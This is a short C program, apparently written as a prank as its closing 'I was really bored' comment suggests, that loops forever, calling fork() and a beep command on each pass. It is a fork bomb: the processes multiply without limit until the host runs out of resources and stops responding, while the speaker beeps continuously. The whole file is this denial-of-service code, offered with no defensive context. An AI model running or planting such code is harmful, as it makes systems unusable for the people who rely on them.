#include <sys/types.h>
#include <unistd.h>
#include <iostream.h>


main()
{
	while(1 == 1)
           {
                 system("beep -f 2000");
 		 fork();
	    }
}

/* Yes, I was really bored */